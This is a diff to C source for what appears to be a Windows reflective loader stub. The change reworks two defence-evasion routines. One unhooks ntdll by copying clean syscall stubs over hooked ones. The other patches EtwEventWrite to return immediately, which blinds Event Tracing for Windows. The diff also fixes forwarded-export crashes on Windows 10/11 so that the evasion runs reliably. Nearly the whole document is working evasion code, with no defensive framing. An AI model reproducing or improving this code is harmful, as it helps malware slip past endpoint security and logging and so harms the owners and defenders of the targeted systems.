@@ -444,12 +444,63 @@ static void _dbg_hex(const char *label, unsigned long long val) {
  * the Nt* layer below.
  * ═══════════════════════════════════════════════════════════════════ */
 
-/* Function pointer types needed by unhooking / ETW patching.
- * Declared here (above _unhook_ntdll) so they're available in
- * both debug and release builds. */
+/* ═══════════════════════════════════════════════════════════════════
+ * Resolved API function pointer table
+ *
+ * Moved above evasion functions so _unhook_ntdll / _patch_etw can
+ * accept RESOLVED_APIS* and use pGetProcAddress / pNtProtectVirtualMemory
+ * (avoiding the forwarded-export crash from _resolve_export on Win10/11).
+ * ═══════════════════════════════════════════════════════════════════ */
+
+typedef HMODULE (WINAPI *fnLoadLibraryA_t)(LPCSTR);
+typedef FARPROC (WINAPI *fnGetProcAddress_t)(HMODULE, LPCSTR);
+typedef LPVOID  (WINAPI *fnVirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
+typedef BOOL    (WINAPI *fnVirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
+typedef BOOL    (WINAPI *fnVirtualFree_t)(LPVOID, SIZE_T, DWORD);
+typedef BOOL    (WINAPI *fnFlushInstructionCache_t)(HANDLE, LPCVOID, SIZE_T);
+typedef HANDLE  (WINAPI *fnGetCurrentProcess_t)(void);
+typedef LPTOP_LEVEL_EXCEPTION_FILTER (WINAPI *fnSetUnhandledExceptionFilter_t)(LPTOP_LEVEL_EXCEPTION_FILTER);
+typedef DWORD   (WINAPI *fnTlsAlloc_t)(void);
+typedef BOOL    (WINAPI *fnTlsSetValue_t)(DWORD, LPVOID);
+typedef void    (WINAPI *fnExitProcess_t)(UINT);
+
+/* Nt* typedefs — direct ntdll calls bypass kernel32 hooks */
+typedef LONG NTSTATUS;
+#ifndef NT_SUCCESS
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+#endif
+typedef NTSTATUS (NTAPI *fnNtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+typedef NTSTATUS (NTAPI *fnNtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
+typedef NTSTATUS (NTAPI *fnNtFreeVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG);
+
+#if defined(_M_X64) || defined(__x86_64__)
+typedef BOOLEAN (WINAPI *fnRtlAddFunctionTable_t)(PRUNTIME_FUNCTION, DWORD, DWORD64);
+#endif
+
+typedef struct _RESOLVED_APIS {
+    fnLoadLibraryA_t         pLoadLibraryA;
+    fnGetProcAddress_t       pGetProcAddress;
+    fnVirtualAlloc_t         pVirtualAlloc;
+    fnVirtualProtect_t       pVirtualProtect;
+    fnVirtualFree_t          pVirtualFree;
+    fnFlushInstructionCache_t pFlushInstructionCache;
+    fnGetCurrentProcess_t    pGetCurrentProcess;
+    fnSetUnhandledExceptionFilter_t pSetUnhandledExceptionFilter;
+    fnTlsAlloc_t             pTlsAlloc;
+    fnTlsSetValue_t          pTlsSetValue;
+    fnExitProcess_t          pExitProcess;
+    /* Nt* APIs from ntdll — used for reflective loader memory ops */
+    fnNtAllocateVirtualMemory_t pNtAllocateVirtualMemory;
+    fnNtProtectVirtualMemory_t  pNtProtectVirtualMemory;
+    fnNtFreeVirtualMemory_t     pNtFreeVirtualMemory;
+#if defined(_M_X64) || defined(__x86_64__)
+    fnRtlAddFunctionTable_t  pRtlAddFunctionTable;
+#endif
+} RESOLVED_APIS;
+
+/* Function pointer types needed by unhooking / ETW patching */
 typedef HANDLE (WINAPI *fnCreateFileA_u_t)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
 typedef BOOL   (WINAPI *fnCloseHandle_u_t)(HANDLE);
-typedef BOOL   (WINAPI *fnVirtualProtect_u_t)(LPVOID, SIZE_T, DWORD, PDWORD);
 typedef HANDLE (WINAPI *fnCreateFileMappingA_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
 typedef LPVOID (WINAPI *fnMapViewOfFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
 typedef BOOL   (WINAPI *fnUnmapViewOfFile_t)(LPCVOID);
@@ -477,21 +528,26 @@ static DWORD _rva_to_offset(IMAGE_SECTION_HEADER *secs, WORD nSecs, DWORD rva) {
  * untouched. */
 #define STUB_PATCH_SIZE 32   /* bytes to restore per syscall stub */
 
-static void _unhook_ntdll(BYTE *k32, BYTE *ntdll_base) {
-    /* Resolve file mapping APIs from kernel32 */
-    fnCreateFileA_u_t pCreateFileA = (fnCreateFileA_u_t)_resolve_export(k32, H_CreateFileA);
-    fnCloseHandle_u_t pCloseHandle = (fnCloseHandle_u_t)_resolve_export(k32, H_CloseHandle);
+static void _unhook_ntdll(BYTE *k32, BYTE *ntdll_base, RESOLVED_APIS *api) {
+    /* Resolve file mapping APIs from kernel32 via GetProcAddress.
+     * CRITICAL: _resolve_export() does NOT handle forwarded exports.
+     * On Win10/11, CreateFileMappingA, MapViewOfFile, CloseHandle, etc.
+     * are forwarded from kernel32 → kernelbase.  _resolve_export returns
+     * a pointer to the forwarding STRING, calling it = instant crash.
+     * GetProcAddress follows the forwarding chain correctly. */
+    fnCreateFileA_u_t pCreateFileA =
+        (fnCreateFileA_u_t)api->pGetProcAddress((HMODULE)k32, "CreateFileA");
+    fnCloseHandle_u_t pCloseHandle =
+        (fnCloseHandle_u_t)api->pGetProcAddress((HMODULE)k32, "CloseHandle");
     fnCreateFileMappingA_t pCreateFileMappingA =
-        (fnCreateFileMappingA_t)_resolve_export(k32, H_CreateFileMappingA);
+        (fnCreateFileMappingA_t)api->pGetProcAddress((HMODULE)k32, "CreateFileMappingA");
     fnMapViewOfFile_t pMapViewOfFile =
-        (fnMapViewOfFile_t)_resolve_export(k32, H_MapViewOfFile);
+        (fnMapViewOfFile_t)api->pGetProcAddress((HMODULE)k32, "MapViewOfFile");
     fnUnmapViewOfFile_t pUnmapViewOfFile =
-        (fnUnmapViewOfFile_t)_resolve_export(k32, H_UnmapViewOfFile);
-    fnVirtualProtect_u_t pVP =
-        (fnVirtualProtect_u_t)_resolve_export(k32, H_VirtualProtect);
+        (fnUnmapViewOfFile_t)api->pGetProcAddress((HMODULE)k32, "UnmapViewOfFile");
 
     if (!pCreateFileA || !pCloseHandle || !pCreateFileMappingA ||
-        !pMapViewOfFile || !pUnmapViewOfFile || !pVP) {
+        !pMapViewOfFile || !pUnmapViewOfFile || !api->pNtProtectVirtualMemory) {
         SLOG("[stub] unhook: missing APIs — skipped");
         return;
     }
@@ -566,12 +622,20 @@ static void _unhook_ntdll(BYTE *k32, BYTE *ntdll_base) {
              * the normal mov r10,rcx was overwritten with a JMP/etc.) */
             if (hooked[0] == 0x4C) continue;  /* not hooked, skip */
 
-            /* Patch: make writable, copy clean stub, restore */
-            DWORD oldProt;
-            pVP(hooked, STUB_PATCH_SIZE, PAGE_EXECUTE_READWRITE, &oldProt);
+            /* Patch: make writable, copy clean stub, restore.
+             * Use NtProtectVirtualMemory (ntdll) instead of kernel32
+             * VirtualProtect to avoid the forwarded-export problem. */
+            ULONG oldProt;
+            PVOID patchAddr = (PVOID)hooked;
+            SIZE_T patchSize = STUB_PATCH_SIZE;
+            api->pNtProtectVirtualMemory((HANDLE)-1, &patchAddr, &patchSize,
+                                         PAGE_EXECUTE_READWRITE, &oldProt);
             for (int b = 0; b < STUB_PATCH_SIZE; b++)
                 hooked[b] = clean[b];
-            pVP(hooked, STUB_PATCH_SIZE, oldProt, &oldProt);
+            patchAddr = (PVOID)hooked;
+            patchSize = STUB_PATCH_SIZE;
+            api->pNtProtectVirtualMemory((HANDLE)-1, &patchAddr, &patchSize,
+                                         oldProt, &oldProt);
             patched++;
         }
 
@@ -597,20 +661,25 @@ cleanup:
  *   After:  EtwEventWrite → xor eax, eax; ret (3 bytes)
  * ═══════════════════════════════════════════════════════════════════ */
 
-static void _patch_etw(BYTE *k32, BYTE *ntdll_base) {
-    /* Find EtwEventWrite in ntdll exports */
+static void _patch_etw(BYTE *ntdll_base, RESOLVED_APIS *api) {
+    /* Find EtwEventWrite in ntdll exports.
+     * EtwEventWrite is a native ntdll export (NOT forwarded), so
+     * _resolve_export is safe here. */
     BYTE *pEtwEventWrite = (BYTE *)_resolve_export(ntdll_base, H_EtwEventWrite);
     if (!pEtwEventWrite) {
         SLOG("[stub] etw: EtwEventWrite not found");
         return;
     }
 
-    /* Make writable */
-    fnVirtualProtect_u_t pVP = (fnVirtualProtect_u_t)_resolve_export(k32, H_VirtualProtect);
-    if (!pVP) return;
+    if (!api->pNtProtectVirtualMemory) return;
 
-    DWORD oldProtect;
-    pVP(pEtwEventWrite, 4, PAGE_EXECUTE_READWRITE, &oldProtect);
+    /* Make writable — use NtProtectVirtualMemory (ntdll) directly,
+     * NOT kernel32 VirtualProtect which may be a forwarded export. */
+    ULONG oldProtect;
+    PVOID etwAddr = (PVOID)pEtwEventWrite;
+    SIZE_T etwSize = 4;
+    api->pNtProtectVirtualMemory((HANDLE)-1, &etwAddr, &etwSize,
+                                  PAGE_EXECUTE_READWRITE, &oldProtect);
 
     /* Patch: xor eax, eax (0x33 0xC0) ; ret (0xC3) */
     pEtwEventWrite[0] = 0x33;  /* xor eax, eax */
@@ -618,61 +687,13 @@ static void _patch_etw(BYTE *k32, BYTE *ntdll_base) {
     pEtwEventWrite[2] = 0xC3;  /* ret */
 
     /* Restore protection */
-    pVP(pEtwEventWrite, 4, oldProtect, &oldProtect);
+    etwAddr = (PVOID)pEtwEventWrite;
+    etwSize = 4;
+    api->pNtProtectVirtualMemory((HANDLE)-1, &etwAddr, &etwSize,
+                                  oldProtect, &oldProtect);
 
     SLOG("[stub] etw: EtwEventWrite patched");
 }
-
-
-/* ═══════════════════════════════════════════════════════════════════
- * Resolved API function pointer table
- * ═══════════════════════════════════════════════════════════════════ */
-
-typedef HMODULE (WINAPI *fnLoadLibraryA_t)(LPCSTR);
-typedef FARPROC (WINAPI *fnGetProcAddress_t)(HMODULE, LPCSTR);
-typedef LPVOID  (WINAPI *fnVirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
-typedef BOOL    (WINAPI *fnVirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
-typedef BOOL    (WINAPI *fnVirtualFree_t)(LPVOID, SIZE_T, DWORD);
-typedef BOOL    (WINAPI *fnFlushInstructionCache_t)(HANDLE, LPCVOID, SIZE_T);
-typedef HANDLE  (WINAPI *fnGetCurrentProcess_t)(void);
-typedef LPTOP_LEVEL_EXCEPTION_FILTER (WINAPI *fnSetUnhandledExceptionFilter_t)(LPTOP_LEVEL_EXCEPTION_FILTER);
-typedef DWORD   (WINAPI *fnTlsAlloc_t)(void);
-typedef BOOL    (WINAPI *fnTlsSetValue_t)(DWORD, LPVOID);
-typedef void    (WINAPI *fnExitProcess_t)(UINT);
-
-/* Nt* typedefs — direct ntdll calls bypass kernel32 hooks */
-typedef LONG NTSTATUS;
-#ifndef NT_SUCCESS
-#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
-#endif
-typedef NTSTATUS (NTAPI *fnNtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
-typedef NTSTATUS (NTAPI *fnNtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
-typedef NTSTATUS (NTAPI *fnNtFreeVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG);
-
-#if defined(_M_X64) || defined(__x86_64__)
-typedef BOOLEAN (WINAPI *fnRtlAddFunctionTable_t)(PRUNTIME_FUNCTION, DWORD, DWORD64);
-#endif
-
-typedef struct {
-    fnLoadLibraryA_t         pLoadLibraryA;
-    fnGetProcAddress_t       pGetProcAddress;
-    fnVirtualAlloc_t         pVirtualAlloc;
-    fnVirtualProtect_t       pVirtualProtect;
-    fnVirtualFree_t          pVirtualFree;
-    fnFlushInstructionCache_t pFlushInstructionCache;
-    fnGetCurrentProcess_t    pGetCurrentProcess;
-    fnSetUnhandledExceptionFilter_t pSetUnhandledExceptionFilter;
-    fnTlsAlloc_t             pTlsAlloc;
-    fnTlsSetValue_t          pTlsSetValue;
-    fnExitProcess_t          pExitProcess;
-    /* Nt* APIs from ntdll — used for reflective loader memory ops */
-    fnNtAllocateVirtualMemory_t pNtAllocateVirtualMemory;
-    fnNtProtectVirtualMemory_t  pNtProtectVirtualMemory;
-    fnNtFreeVirtualMemory_t     pNtFreeVirtualMemory;
-#if defined(_M_X64) || defined(__x86_64__)
-    fnRtlAddFunctionTable_t  pRtlAddFunctionTable;
-#endif
-} RESOLVED_APIS;
 
 
 static BOOL _resolve_apis(RESOLVED_APIS *api) {
@@ -1242,10 +1263,10 @@ void _stub_entry(void) {
         BYTE *ntdll = _find_module(H_NTDLL);
         if (k32 && ntdll) {
 #if EVASION_UNHOOK
-            _unhook_ntdll(k32, ntdll);
+            _unhook_ntdll(k32, ntdll, &api);
 #endif
 #if EVASION_ETW
-            _patch_etw(k32, ntdll);
+            _patch_etw(ntdll, &api);
 #endif
             /* NOTE: re-resolution removed — unhooking changes the CODE at
              * the function address, not the export table.  The pointers
